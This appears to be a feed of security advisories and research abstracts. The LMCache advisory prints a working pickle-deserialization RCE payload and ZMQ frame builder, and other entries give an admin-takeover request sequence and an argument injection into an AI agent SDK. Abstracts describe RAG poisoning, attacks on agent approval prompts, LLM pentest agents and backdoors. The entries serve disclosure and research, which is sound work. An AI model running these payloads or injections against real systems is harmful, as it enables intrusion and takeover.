items.title: LMCache: Remote code execution via unsafe deserialization in multiprocess mode transport
items.summary:
### Summary

LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport



### Details

LMCache multiprocess mode, also called distributed mode, opens an unauthenticated ZeroMQ ROUTER so worker processes can register and share KV cache blocks. The intended clients are sibling LMCache processes. There is no CURVE, ZAP, password, or message authentication on that socket. LMCache used only inside a vLLM process does not open this port. The transport binds to localhost unless the operator sets a routable address with --host, which is how multi-node deployments let peers connect. The 9.8 score is for that routable configuration. A stock single-host install that leaves the default bind is not reachable from other machines.

Messages on the socket are msgpack. Extension code 1 is registered for DeviceIPCWrapper and is passed to DeviceIPCWrapper.Deserialize in lmcache/v1/platform/base/ipc_wrapper.py, which calls pickle.loads. That hook runs from ext_hook in lmcache/v1/multiprocess/custom_types.py while the server is still decoding REGISTER_KV_CACHE arguments, before the handler runs. A single unauthenticated ZMQ DEALER message to the transport port (default 5555) therefore executes code as the user the LMCache process runs as. Official container images run that process as root.

The decode path shipped in v0.3.9. It is still present in the latest PyPI release, v0.5.5, in the v0.5.6 release candidates through v0.5.6rc3, and on the dev branch as of 2026-10-07. No fixed version has been published.



### Proof of concept

Step 1 - Start multiprocess mode bound to a routable address


This is the documented multi-node setting. The ZMQ transport listens on port 5555.

```
   python -m lmcache.v1.multiprocess.http_server \
    --http-host 127.0.0.1 --http-port 8080 \
    --host 0.0.0.0 --port 5555 \
    --l1-size-gb 0.25 --eviction-policy LRU \
    --hash-algorithm blake3 --instance-id mp-node-01
```
Step 2 - Build a REGISTER_KV_CACHE frame whose cache slot is a pickle


Payload slot 1 is a msgpack extension with code 1. The server unpickles that body while it is still decoding arguments. The command writes id to /tmp/zmq_pwn.

```
import os
import pickle
import msgspec
import zmq

class EvilPayload:
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        return (os.system, (self.cmd,))

evil_pickle = pickle.dumps(EvilPayload("id > /tmp/zmq_pwn 2>&1"))

REGISTER_KV_CACHE = 1
EXT_CODE = 1
NUM_PAYLOADS = 7
KVCACHE_INDEX = 1

b_uid = msgspec.msgpack.encode(0)
b_type = msgspec.msgpack.encode(REGISTER_KV_CACHE)
payloads = [msgspec.msgpack.encode(None)] * NUM_PAYLOADS
payloads[0] = msgspec.msgpack.encode(0)
payloads[KVCACHE_INDEX] = msgspec.msgpack.encode(
    [msgspec.msgpack.Ext(EXT_CODE, evil_pickle)]
)
frames = [b_uid, b_type, *payloads]
```
Step 3 - Send the frame


```
ctx = zmq.Context()
s = ctx.socket(zmq.DEALER)
s.connect("tcp://127.0.0.1:5555")
s.send_multipart(frames)
```
The pickle runs during argument decode. The server then logs a type error for REGISTER_KV_CACHE because the handler expected a DeviceIPCWrapper and received the return value of os.system. That error is after the command has already run.


Step 4 - Confirm the command ran as the LMCache user


```
cat /tmp/zmq_pwn
```
Expected output on an official image, where the process runs as root:

```
uid=0(root) gid=0(root) groups=0(root)
```

### Impact

LMCache's multiprocess (MP) mode uses a ZeroMQ transport (port 5555 by default) that does not require authentication. Device IPC descriptors received on this transport were deserialized with `pickle.loads`. An attacker who can reach the transport port can send a single crafted message and execute arbitrary code with the privileges of the LMCache process.

By default the transport binds to localhost, and single-process (in-process) mode does not open the port. Deployments are exposed when the transport binds a routable address, as mul

items.title: kin-openapi openapi3filter: nil-pointer panic in ValidateResponse on a response header declared with content
items.summary:
## Summary

`ValidateResponse` panics on a nil pointer when a spec declares a response header with `content` instead of `schema`. `doc.Validate()` accepts that document, so the crash comes from a spec the library just called valid.

Same class as GHSA-jpcw-4wr7-c3vq, which covered the request-parameter case in v0.144.0; this is the response-header path.

Affects `github.com/getkin/kin-openapi` `<= v0.145.0`. Reproduced on master `947498e5a6bd`, Go 1.26.

## Details

A `content`-typed response header has `headerRef.Value.Schema == nil`.

`validate_response.go:181` passes it straight through:

```go
if decodedValue, found, err = decodeValue(dec, headerName, sm, headerRef.Value.Schema, headerRef.Value.Required); err != nil {
```

and `req_resp_decoder.go:273` is where it lands:

```go
if len(schema.Value.AllOf) > 0 {
```

Two things I checked rather than assumed. The response does not need to carry the header; declaring it is enough, and then every call for that operation panics. And the body path is fine, `:114` returns early on a nil schema, so this is headers only. The PoC keeps the body case as a control.

## PoC

Drop into `openapi3filter/` and run:

```
go test ./openapi3filter/ -run NilSchema -v
```

```go
package openapi3filter_test

import (
	"context"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers"
)

const specBody = `
openapi: 3.0.3
info: {title: poc, version: "1.0.0"}
paths:
  /x:
    get:
      responses:
        "200":
          description: ok
          content:
            application/json: {}
`

const specHeader = `
openapi: 3.0.3
info: {title: poc, version: "1.0.0"}
paths:
  /x:
    get:
      responses:
        "200":
          description: ok
          headers:
            X-Thing:
              content:
                application/json: {}
`

func validatedInput(t *testing.T, spec string, hdr http.Header) *openapi3filter.ResponseValidationInput {
	t.Helper()
	doc, err := openapi3.NewLoader().LoadFromData([]byte(spec))
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	if err := doc.Validate(context.Background()); err != nil {
		t.Fatalf("doc.Validate rejected the spec, so this repro proves nothing: %v", err)
	}
	op := doc.Paths.Find("/x").Get
	req := httptest.NewRequest(http.MethodGet, "/x", nil)
	return &openapi3filter.ResponseValidationInput{
		RequestValidationInput: &openapi3filter.RequestValidationInput{
			Request: req,
			Route:   &routers.Route{Spec: doc, Operation: op, Method: http.MethodGet, Path: "/x"},
		},
		Status: 200,
		Header: hdr,
		Body:   io.NopCloser(strings.NewReader(`{}`)),
	}
}

// Control: body path returns early on a nil schema.
func TestControl_ResponseBodyNilSchema(t *testing.T) {
	in := validatedInput(t, specBody, http.Header{"Content-Type": {"application/json"}})
	defer func() {
		if r := recover(); r != nil {
			t.Errorf("body path panicked, expected clean return: %v", r)
		}
	}()
	if err := openapi3filter.ValidateResponse(context.Background(), in); err != nil {
		t.Errorf("body path returned %v, expected nil", err)
	}
}

// The response does not carry X-Thing. Declaring the header is enough.
func TestResponseHeaderNilSchema(t *testing.T) {
	in := validatedInput(t, specHeader, http.Header{"Content-Type": {"application/json"}})
	if err := openapi3filter.ValidateResponse(context.Background(), in); err != nil {
		t.Fatalf("no panic; got err = %v (already fixed?)", err)
	}
}
```

Output:

```
=== RUN   TestControl_ResponseBodyNilSchema
--- PASS: TestControl_ResponseBodyNilSchema (0.00s)
=== RUN   TestResponseHeaderNilSchema
--- FAIL: TestResponseHeaderNilSchema (0.00s)
panic: runtime error: invalid memory address or nil pointer dereference [recovered, repanicked]
[signal SIGSEGV: segmentation violation code=0x1 addr=0x20 pc=0x7f6d2a]

github.com/getkin/kin-openapi/openapi3filter.decodeValue(...)
	/src/openapi3filter/req_resp_decoder.go:273 +

items.title: Arcane: Environment access token bypasses the admin-required authorization gate on `/api/debug/pprof`
items.summary:
## Summary

Arcane v2.10.2 contains an authorization inconsistency in `AuthMiddleware.managerAuth`.

When a request supplies a valid environment access token through the `X-Arcane-Agent-Token` header, `managerAuth` resolves the associated environment, installs an environment-scoped permission set, and immediately calls `next(c)`.

This occurs before the middleware evaluates the `AdminRequired` option and verifies that the caller is a global administrator.

As a result, an environment-scoped access token can access routes protected with `WithAdminRequired()`, despite the corresponding `EnvironmentPermissionSet` intentionally containing no global or sudo permissions.

In v2.10.2, the affected admin-only surface is the manager's Go `pprof` diagnostic interface under:

`/api/debug/pprof/*`

This exposes diagnostic and runtime profiling information that the application explicitly intends to restrict to global administrators.

The issue is an incorrect authorization vulnerability (CWE-863).

## Details

### 1. Environment access tokens are accepted by the manager authentication middleware

The production authentication middleware is configured with an environment access-token resolver:

`backend/internal/di/providers.go`

Conceptually, the middleware is constructed as:

```go
auth.NewAuthMiddleware(authService, cfg).
    WithApiKeyValidator(apiKey).
    WithEnvironmentAccessTokenResolver(env).
    WithPermissionResolver(role)
```

Therefore, the `X-Arcane-Agent-Token` authentication path is active in the production manager.

### 2. The environment-token path returns before authorization options are evaluated

The relevant logic is in:

`backend/internal/auth/middleware.go`

`managerAuth` first checks the `X-Arcane-Agent-Token` header.

When the token resolves to an environment, the middleware installs an environment-scoped permission set and immediately continues processing:

```go
if agentToken := req.Header.Get(utils.HeaderAgentToken); agentToken != "" {
    if env, ok := m.resolveEnvironmentAccessToken(ctx, agentToken).Get(); ok {
        environmentScopedInternal(c, env)
        return next(c)
    }
}
```

The important part is the unconditional:

```go
return next(c)
```

The normal authentication path later evaluates the middleware's `AdminRequired` option:

```go
ps := m.resolvePermissionsOrDeny(ctx, user)

if m.options.AdminRequired && !ps.IsGlobalAdmin() {
    return c.JSON(http.StatusForbidden, common.APIError{
        Code:    "FORBIDDEN",
        Message: "You don't have permission to access this resource",
    })
}
```

The environment-token branch never reaches this check.

Consequently, `WithAdminRequired()` has no effect when authentication succeeds through a valid environment access token.

This creates an authorization inconsistency between authentication mechanisms:

- normal user/session authentication → `AdminRequired` is enforced;
    
- environment access-token authentication → `AdminRequired` is bypassed.
    

### 3. Environment tokens are intentionally not global-administrator credentials

`backend/pkg/authz/permission_set.go` defines the effective permissions assigned to an environment access token.

`EnvironmentPermissionSet(envID)` grants environment-scoped permissions only for the specified environment:

```go
func EnvironmentPermissionSet(envID string) *PermissionSet {
    ps := NewPermissionSet()

    if envID == "" {
        return ps
    }

    for _, p := range AllPermissions() {
        if IsEnvScoped(p) {
            ps.AddEnv(envID, p)
        }
    }

    return ps
}
```

The implementation explicitly establishes that these credentials do not receive global or sudo permissions.

Therefore, an environment access token should not satisfy a global-administrator authorization requirement.

The early return in `managerAuth` bypasses this intended privilege boundary.

items.title: Private Retrieval Augmented Generation via Random Projection
items.summary: Retrieval-Augmented Generation (RAG) enhances the capabilities of large language models (LLMs) by querying external structured knowledge. However, it can also introduce privacy risks by leaking sensitive information from the retrieval datastore. We propose a simple method to preserve datastore privacy in RAG systems via random projection. By applying the same projection to both datastore embeddings and query embeddings, our method provably preserves semantic similarity between queries and retrieved items while substantially mitigating data extraction attacks. Across multiple RAG architectures and datasets, we show that this lightweight approach achieves superior retrieval and generation performance compared to prior methods which leverage formal differential privacy (DP) guarantees, while exhibiting comparable empirical privacy under strong attack models. Our results for the first time suggest that random projection can serve as a competitive and practical baseline for privacy-preserving RAG systems.

items.title: Poisoning the Neighborhood: A Topology-Aware Topic-Level Attack on Large-Scale HNSW-based RAG Systems
items.summary: Retrieval-augmented generation (RAG) mitigates hallucinations and knowledge staleness in large language models using external knowledge. However, ingestion from public and third-party sources exposes RAG systems to poisoning attacks. Existing attacks are designed and evaluated under exact retrieval, where poisoned documents participate in global ranking. Deployment-scale systems instead rely on approximate nearest-neighbor (ANN) indexes such as hierarchical navigable small world (HNSW), where limited search budgets, graph-search reachability, and local benign-document competition invalidate this assumption and degrade existing attacks. We present a topology-aware topic-level poisoning attack against large-scale HNSW-RAG that generalizes to unseen topic queries. We organize poisoned documents into a Hub-Satellite structure: Satellites provide competitive entry points across semantic regions, while Hubs strengthen local cohesion and facilitate cascading retrieval. For generation, we propose an entity-claim promotion attack combining evidence anchoring and entity-claim coupling to promote the target entity via a target claim across different query regions. On 2M-document Wikipedia, our attack maintains over 72% retrieval success and reaches 31.29% attack success, substantially outperforming baselines; domain-specific experiments further support its effectiveness. Structural analyses show that the Hub-Satellite topology forms in HNSW, indicating that graph structure contributes to improved poisoned-document retrieval. Existing poisoning defenses cannot mitigate the attack, exposing graph-structural risks in HNSW-RAG systems.

items.title: From One Query to Many: A Critical Survey of Privacy Accounting in RAG
items.summary: Retrieval-augmented generation (RAG) enables large language models to leverage external knowledge but introduces privacy risks when the retrieved corpus contains sensitive information. Differential privacy (DP) offers formal protection, yet interpreting and comparing privacy guarantees across existing DP-RAG methods remains challenging. In particular, a privacy budget reported for a single response does not directly characterize privacy loss over repeated queries, and even identical values of $\varepsilon$ may represent different guarantees depending on the protected data unit, accounting horizon, and observable outputs. This survey critically examines how privacy accounting evolves from single-query generation to multi-query RAG systems. We categorize existing approaches into query-time privatization, multi-query accounting, and one-time corpus privatization. We analyze their underlying assumptions and privacy--utility trade-offs. Rather than ranking methods by $\varepsilon$ alone, we propose a framework that interprets a DP-RAG guarantee along three dimensions: privacy granularity, accounting scope, and release boundaries. We conclude that an $\eps$ is a claim only together with the three slots: the protected unit, the accounting scope, and the release boundary.

items.title: Approve What, Exactly? Effect Binding and Trusted Rendering for Agent Step-Up Authorization
items.summary: AI agents now pause for approval before they send money, delete files or email outsiders, and that approval is usually treated as a second factor. We argue it is one only when compromising the agent cannot produce it and when it names exactly what it approves, and we test both conditions. We define twelve attacks on the approval path, including decoy recipients, amount cancellation, card padding, label spoofing, enrollment squatting and threshold splitting, and run them against the Agent Payments Protocol (AP2), the Microsoft action-bound approval design and Model Context Protocol (MCP) elicitation. An audit of ten agent runtimes finds no third-party verifiable approval record, no flood limits where measurable, and post-approval argument changes in four of eight runtimes with measurable binding. As a reference defense we build ASU (Agent Step-Up), a gateway that renders the approval card from a canonical effect descriptor, has a passkey on the phone of the user sign its digest, and executes only the stored call. Tamarin proves its binding, single-use and key-level non-repudiation properties under three stated hypotheses (53 lemmas). Across 27,108 scripted trials and 609 AgentDojo attack pairs, ASU stops substitution, replay and grant stretching, and the trusted card cuts forged-narration attack success from 0.54 to 0.03. With 15 current language models as automated approvers, the trusted card raises the attack catch rate from 0.30 to 0.98, at the cost of refusing 16 percent of harmless near misses, mostly due to a placeholder artifact in our stimuli. A second device adds nothing measurable over a trusted on-host confirmation in these experiments, flooding still succeeds 0.45 to 0.60 of the time against a modeled approver, and approval cannot stop effects that policy already allows. Code, data and proofs: https://github.com/Sports-Vision-Inc/agent-step-up

items.title: Thinking in Graphs: Neo4j-Backed Exploit-Chain Reasoning for LLM Penetration-Testing Agents
items.summary: LLM coding agents such as Claude Code and OpenAI Codex can drive penetration-testing tools, but they reason about an engagement as a flat list of findings in a context window. Attackers think in graphs: isolated low-severity exposures turn catastrophic once chained through credential capture, privilege escalation, and lateral movement. This gap feeds a common belief that AI agents cannot truly chain exploitation; we argue this describes the flat context window, not the model. We present ChainGraph, a pattern that externalizes exploit-chain reasoning into a Neo4j property graph wired to an off-the-shelf agent via the Model Context Protocol, no bespoke harness. Findings, attack steps, credentials, assets, and tamper-evident evidence receipts are typed nodes with pre/post-condition edges; JSON/Markdown holds documentary memory while Neo4j holds reasoning memory. We formalize five operator questions (next-step inference, entry-to-crown-jewel pathing, combined-severity promotion, evidence provenance, and chokepoint identification) as reusable Cypher and Graph Data Science queries, plus a chain-severity score distinct from per-finding local severity. On a synthetic multi-forest Active Directory engagement modeled on GOAD, in live Neo4j with GDS, three findings rated Medium in isolation become Critical once their path to the forest root is materialized, and betweenness centrality names the best chain break-points. Scoping each decision to a graph result rather than re-reading the engagement cut the reasoning payload by about 98% on a token proxy. We give a reproducible setup for Claude Code and Codex. Results are illustrative single-run measurements, not a benchmark.

items.title: Towards Efficient Threat Intelligence Instruction Tuning via Quality-Aware and Optimal Transport-Guided Data Selection
items.summary: High-quality data is essential for improving instruction tuning in threat intelligence analysis. However, existing methods for generating cybersecurity instruction data lack reliable quality assessment mechanisms, and gradient influence-based data selection methods primarily focus on single-sample matching, failing to cover diverse and complex security capabilities. To address these issues, we propose CTI-TDS, a Targeted Data Selection method for instruction tuning in Cyber Threat Intelligence analysis. Specifically, we first filter high-quality CTI instructions by integrating instruction style consistency and security knowledge verification. Furthermore, we formulate gradient influence as a distribution alignment problem, learning a gradient subspace of target tasks and applying entropic regularized optimal transport to optimize distribution matching between training samples and target tasks, enabling diversity-aware data selection. We conduct extensive experiments on CTIBench across multiple large language models. Experimental results demonstrate that when fine-tuning with only a small set of high-value instruction data, CTI-TDS outperforms existing data selection methods and achieves competitive performance on threat intelligence analysis tasks.

items.title: CascadeLedger: Counterfactual Auditing of Information and Resource Integrity in LLM Cascades
items.summary: We introduce CascadeLedger, a counterfactual execution-audit framework for budgeted language-model cascades. The protocol enforces call-before-read semantics, binds successful reads to service and cache identities, records availability and component-wise budget transitions, and freezes the event trace before any target or task scorer is joined. The central object is aggregate-equivalent trace validity: two executions can share a final answer, declared resource projection, and service histogram while differing in whether their routing decisions used only legitimately observable information. We complement single-trace invariants with counterfactual prefix non-interference (CPNI), which couples a visible prefix and policy randomness while changing only a declared hidden family. The counterfactual influence frontier (CIF) localizes the earliest violating prefix and a minimal hidden witness; projection-preserving adversarial mutation (PPAM) searches for invalid traces that remain acceptable to a non-counterfactual checker. Across frozen-cache, independently generated, and serving evaluations, the two-layer audit reports a clean false-positive rate of 0.0000, detects 0.9983 of serialized faults and 0.9982 of unlogged hidden-read faults, and changes 0.3403 of corrupted quality-resource conclusions after deterministic recomputation. The online recorder and offline CPNI audit have separate overhead measurements. Learned routing and semantic verification provide downstream compatibility studies under the same execution contract.

items.title: A Graph-Based Analysis of Comparability, Scale, and Attribution in Private Transformer Inference
items.summary: Rising privacy concerns around large language models have accelerated research in private Transformer inference (PTI). Synthesizing the empirical claims in this line of research, however, is hindered by multi-dimensional cryptographic progress and inconsistent evaluation contracts. In this work, we systematize the field by constructing an empirical graph of 62 PTI systems, mapping system attributes to node features and evaluation compatibility to edges. A three-tiered analysis of this graph illuminates the state of private inference. Node-level attribution shows that cryptographic progress drives performance gains across most systems, yet always co-occurs with other factors (model fidelity, hardware, cost accounting). Edge-level auditing shows that only 1 of 1891 candidate system pairs is directly comparable under shared assumptions. Finally, graph-level analysis shows that the scaling frontier of private inference has plateaued at 13B parameters and projects the cost of deploying current PTI techniques on production-scale Transformers. Overall, this graph-based framework equips the community to evaluate PTI claims transparently and channel technical speedups into deployment-scale private inference.

items.title: Benchmarking Post-Quantum Key Encapsulation in S3-Compatible Object Storage under Client Concurrency
items.summary: Data encrypted today with classical public-key algorithms could be decrypted once large quantum computers exist. Cloud object stores keep data for years, so the client-side encryption that protects it must move to post-quantum algorithms such as ML-KEM, which adds a key-encapsulation step and a larger ciphertext to every stored object. So far, the cost of ML-KEM has been measured for the algorithm on its own and for securing network connections, but not for encrypting each object in a storage system that serves many clients at once. It has therefore been unclear whether ML-KEM slows such a system, under which conditions, and why. We address this problem by measuring per-object ML-KEM against classical key exchange on an S3-compatible object store, with two client implementations, two processor types and up to 500 concurrent workers, using pre-registered experiments and statistical equivalence tests. ML-KEM reduced throughput only when the client's processor was at or near full load, with one unexplained exception, and then by 4.0 to 4.9% in our main client. Controlled experiments on one processor type traced most of that loss to the way the software library was called, and a second, native client showed that the size of the loss depends on the implementation. The lasting cost is storage: 1,056 more bytes per object than with classical key exchange. The results cover two clients, one single-node store and one cloud provider.

items.title: Clean Data Can Still Carry Backdoors: Support-Persistent Backdoors for Model Reuse
items.summary: Traditional backdoor attacks inject artificial trigger patterns into training data, causing models to misclassify triggered inputs while maintaining normal behavior on clean samples. Since these artificial triggers are absent in clean datasets, standard knowledge distillation (KD) typically eliminates them, leading to the common belief that KD serves as an effective purification defense. In this paper, we propose DAR (Discover-and-Relabel), a support-persistent backdoor method that retains its behavior even after clean-data distillation. DAR identifies naturally abundant patterns in low-dimensional feature subspaces using subspace clustering and applies label-only poisoning to samples that inherently satisfy the discovered rule. At test time, the backdoor is activated by locally modifying the corresponding subspace of the target images. By instantiating spatial and frequency operators, DAR achieves attack accuracy comparable to state-of-the-art backdoor attacks in ImageNet classification and CLIP-based prompt tuning. Notably, DAR keeps attack success above 96% after clean KD and remains defense-resistant in practice. Project page: https://junhoo.me/backdoor

items.title: Blind Watermarking of Software Repositories via Module Placement
items.summary: Source-code watermarking supports provenance tracking by embedding a recoverable identifier in a software artifact. Many existing approaches encode this identifier in tokens or program syntax, exposing the watermark to transformations that modify the source text. We present PlaceMark, a blind watermarking system that encodes a payload in the placement of modules within a repository. Each eligible module is identified by its filename and top-level definition names. A secret key determines its ordered candidate destinations and its position in the reading order; the module's location within its candidate list determines the encoded symbol. Embedding relocates selected modules and updates their import references. Extraction uses the distributed repository, the key, and agreed decoding parameters, without an original copy or placement ledger. Capacity measurements on ten Python repositories yield nominal capacities of 249 to 2,166 bits in nine repositories, while one provides no placement channel. In 216 trials of the evaluated text transformations, the payload is recovered exactly. Relocation degrades recovery gradually on Django, Airflow and Salt, while on Pylint a path-based exclusion in our implementation lets relocation change carrier membership, and we measure it for an untargeted adversary and for one that concentrates its budget on the public carrier set. Changes to filenames or definition names alter the identity input and are measured separately. Exact recovery also depends on placement feasibility. The results characterize module placement as a carrier that can complement watermarks embedded in source text.

items.title: ESAU: Expeditious Swarm Remote Attestation for Pub-Sub IoT Networks with Untrusted Cloud-based Proxy Verifier
items.summary: As Internet of Things (IoT) devices collect and process data, security is essential. IoT devices often combine with other emerging technologies, such as artificial intelligence (AI) and fifth-generation (5G) communications, to support applications such as smart grids and internet-of-vehicles (IoV). Because IoT devices are deployed remotely, remote attestation (RA) effectively verifies each device's state. However, the scale of IoT deployments makes device management challenging for owners. Therefore, cloud-assisted IoT management services often provide RA solutions. Although cloud-based IoT services can securely manage IoT devices, passive malicious administrators or hacked IoT device owners' accounts can control IoT devices without cloud IoT service authorization. Therefore, this work proposes a cloud-assisted RA system that addresses three main challenges of IoT device RA: 1) lightweight RA design for resource-limited IoT devices, 2) unauthorized access to IoT devices by passive malicious administrators or compromised owner accounts on the cloud IoT management platform, and 3) RA may not extend to an authenticated key exchange protocol. In addition to proposing a swarm RA scheme that addresses these three challenges, this work analyzes the system's security properties and evaluates its feasibility through implementation and simulation.

items.title: AWARE-RG: Abstraction Aware Explanation of Resiliency Graphs for Cyber Physical Systems
items.summary: Understanding the security posture of cyber physical systems (CPS) requires reasoning across both information technology (IT) and operational technology (OT). However, a security analyst often holds an incomplete, role-specific view of the underlying system which has most likely resulted from their knowledge limited by a need-to-know framework. Such an incomplete view can potentially lead them to incorrectly assess if a cyber attack produces an untoward physical consequence resulting in making uninformed decisions about system resilience. In this work, we present AWARE-RG (Abstraction Aware Explanation of Resiliency Graphs), a semi-automated, human-in-the-loop framework that provides an analyst with a role-bounded, need-to-know explanations of resiliency paths in a CPS. The AWARE-RG abstraction structure is derived using Formal Concept Analysis over MITRE ATT&CK for ICS tactics, ordered by the ICS Cyber Kill Chain. For valid attack-fault queries, plan repair and backward means-end analysis identify the missing dependencies, explain why the physical hazard is reachable, and suggest defensive strategies. For invalid attack-fault queries, AWARE-RG localizes the first abstraction level at which the path fails, and reports confirmed blocking conditions as hardening pointers.

items.title: Coder before 2.34.7 contains an IP spoofing vulnerability in the ExtractRealIPAddress middleware...
items.summary: Coder before 2.34.7 contains an IP spoofing vulnerability in the ExtractRealIPAddress middleware that trusts the leftmost, client-supplied X-Forwarded-For value instead of the client IP appended by a reverse proxy. items.title: Coder from 2.26.0 before 2.34.8 contains an incorrect authorization flaw in the GET /api/v2...
items.summary: Coder from 2.26.0 before 2.34.8 contains an incorrect authorization flaw in the GET /api/v2/workspaces/{id}/acl endpoint, which checks only workspace read access and then fetches group members using an elevated system context. items.title: Arcane: Delegated users:update permission allows admin account takeover via password reset (no privilege-hierarchy check)
items.summary:
## Summary
A user holding the delegated `users:update` permission can reset the global administrator's password and take over the admin account. `UpdateUser` sets the target user's `PasswordHash` from the request body for ANY target with no comparison of caller-vs-target privilege. Because role assignment and role CRUD are deliberately gated by `RequireGlobalAdmin`, `users:update` is intended to sit BELOW admin (profile management); this finding defeats that separation.

## Root Cause
`UpdateUser` (handler `backend/api/handlers/users.go:317-323`) loads the target by ID and sets `userModel.PasswordHash` from the request body for any user, then `userService.UpdateUser` (`user_service.go:174`) simply `tx.Save`s — with NO actor-vs-target privilege comparison. The only `IsGlobalAdmin` guard (`user_service.go:345`) is a last-admin check inside `DeleteUser`, not the update path. Role assignment / role CRUD are `RequireGlobalAdmin` (`backend/pkg/authz/permissions.go:27-33`), proving `users:update` is intended below admin.

## Impact
Complete administrator account takeover (C:H/I:H/A:H) by any holder of the delegated `users:update` permission.

## Proof of Concept
1. Admin delegates a custom "User Manager" role with `users:update`.
2. `PUT /users/{adminId}` with `{"password":"attacker123"}`.
3. `POST /auth/login {"username":"arcane","password":"attacker123"}` → admin session.

## Attack Chain
1. Action: admin delegates custom role with `users:update`. Guard: role creation is `RequireGlobalAdmin`. Bypass: intended delegation (holder is meant to manage profiles, not seize admin).
2. Action: `PUT /users/{adminId}` `{"password":"attacker123"}`. Guard: `RequirePermission(users:update)` (`users.go:154`). Bypass: holder has it; no hierarchy check (`users.go:317-323`, `user_service.go:174` unconditional Save).
3. Action: `POST /auth/login` as admin → admin session.

## Bypass Evidence
- `users.go:317-323` sets `PasswordHash` for any target; `user_service.go:174-194` has no actor/target privilege comparison.
- Only `IsGlobalAdmin` hits are `DeleteUser`'s last-admin guard and DTO flags (grep).
- `users:update` is org-level, held by no built-in non-admin role (`permissions.go:24`).

## Affected Versions
`<= 2.5.0`.

Reported by **zx (Jace)** — GitHub: @manus-use

items.title: Wasmtime: WASI hard links bypass wasmtime-wasi's FilePerms for destination
items.summary:
## Summary

Wasmtime's WASI filesystem implementation lets a guest with a read-only source file capability overwrite that file by hard-linking it into another preopen that allows file writes. An attacker who can run a WASI guest can bypass `WasiCtxBuilder` per-preopen `FilePerms` and modify host files that were exposed as `FilePerms::READ`.

This attack is possible through the wasip1, wasip2, and wasip3 interfaces to the WASI filesystem.

This attack is also possible through an indirection of renaming a hardlink into another preopen.

### Details

`WasiCtxBuilder::preopened_dir` documents `file_perms` as the maximum permissions usable for files in that preopen. However, hard-link creation and renaming only checked directory mutation for permission, and not whether the file permissions matched.

This makes an attack possible where:
* a read-only file `target` exists in a preopen with only FilePerms::READ
* a hardlink named `alias`, with destination to the `target`, is created in a preopen with FilePerms::READ | FilePerms::WRITE
* the attacker opens the file `alias` for writing, in which they can overwrite `target`

The same attack is possible by way of renaming:
* a read-only file `target` exists in a preopen with only FilePerms::READ
* a hardlink named `alias`, with destination to the `target`, is created in that same preopen
* the `alias` file is renamed into a preopen with FilePerms::READ | FilePerms::WRITE
* the attacker opens the file `alias` for writing, in which they can overwrite `target`

Symbolic links are not a vector for this attack because the wasi-filesystem interfaces already enforces that the destination for a symlink is under the same preopen. We do not believe there are any other vectors to this attack because there are no other wasi filesystem interfaces that take multiple borrows of a descriptor resource for e.g. the source and destination in different descriptors.

### Remediation

The definition of `Dir::link_at` and `Dir::rename_at` in wasmtime-wasi's `src/filesystem.rs` now have an additional permissions check that ensures the source and destination values for the directory permissions `perms` and the file permissions `file_perms` are identical.

```rust
        if self.perms != new_dir.perms || self.file_perms != new_dir.file_perms {
            return Err(ErrorCode::NotPermitted);
        }
```

### Impact

Only wasmtime-wasi embeddings that use a combination of DirPerms::MUTATE with FilePerms::READ, as well as using a second preopen with higher permissions (FilePerms::WRITE as well), are affected by this bug, e.g. those that use in the WasiCtxBuilder:

```rust
builder.preopened_dir("readwrite", "readwrite", DirPerms::READ | DirPerms::MUTATE, FilePerms::READ | FilePerms::WRITE);
builder.preopened_dir("readonly", "readonly", DirPerms::READ | DirPerms::MUTATE, FilePerms::READ);
```

In particular, the Wasmtime project's wasmtime-cli's use of wasmtime-wasi is not affected, because it always sets FilePerms::all() for all preopens.

items.title: Claude Agent SDK: Argument Injection via resume Option Allows Arbitrary Command Execution
items.summary:
The Claude Agent SDK for Python passed the `resume` option to the Claude CLI without validation, allowing a value beginning with `-` to be interpreted as a separate CLI flag. An attacker who controlled the `resume` value could inject an `--mcp-config` flag defining a stdio MCP server, resulting in arbitrary command execution at CLI startup that bypassed the SDK's permission controls. Exploitation required an application to pass untrusted input as the session ID to resume.

Users are advised to update to the latest version of the claude-agent-sdk package.

Thank you to hackerone.com/moamenmahmood for reporting this issue.

items.title: ckan-mcp-server: DataStore Table UI resource does not validate postMessage origin (in) and posts to targetOrigin "*" (out)
items.summary:
## Summary

The MCP Apps UI resource (an interactive DataStore table rendered in the host's webview/iframe) communicates with its parent via `postMessage`. Its inbound `message` listener performs no `event.origin` validation, and its outbound messages are sent with target origin `'*'`. Any window/frame able to reach the document can inject data into the table and interfere with the MCP UI handshake, and the UI's own JSON-RPC messages are broadcast without an origin restriction.

## Affected code

`src/resources/datastore-table-ui.ts` (inline HTML):

```js
window.addEventListener('message', function (event) {
  var msg = event.data;                    // no check of event.origin
  if (!msg || typeof msg !== 'object') return;
  if (msg.id !== undefined && _pending[msg.id]) { ... resolve/reject pending MCP request ... }
  ...
  if (data && (data.fields || data.records)) initTable(data);   // renders attacker-supplied data
});

// outbound:
window.parent.postMessage({ jsonrpc: '2.0', id: id, method: method, params: params || {} }, '*');
mcpNot: window.parent.postMessage({ jsonrpc:'2.0', method:method, params:params||{} }, '*');
```

There is no allowlist of accepted origins for inbound messages and no fixed target origin for outbound messages.

## Impact

- **Content spoofing.** A frame that can `postMessage` to the UI can supply
  arbitrary `fields`/`records`, causing the table to render fabricated rows and
  links (e.g. a phishing `__link_url`) that appear to come from the queried
  portal. (Values are HTML-escaped, so this is display spoofing, not script
  injection — no XSS.)
- **Handshake/UX interference.** Because inbound messages matching a pending `id`
  resolve/reject the UI's MCP requests, an attacker frame can spoof responses to
  the `ui/initialize` handshake or otherwise disrupt the panel.
- **Outbound leakage.** Posting to `'*'` means the UI's JSON-RPC messages are
  delivered to whatever the parent origin is; if the resource is ever embedded by
  a context other than the trusted host, those messages leak to it.

Exploitability depends on the host embedding model (in a correct MCP Apps host the
parent is the trusted host, which limits who can message the frame), so this is a
hardening / defense-in-depth issue rather than a directly remotely-triggerable
one — hence Low.

## Proof of concept

- `poc/verify-no-origin-check.mjs` — static confirmation that the listener has no
  origin check and outbound uses `'*'`:

  ```
  [x] validates event.origin             : NO
  [x] outgoing postMessage targetOrigin  : '*' (any)
  RESULT: VULNERABLE
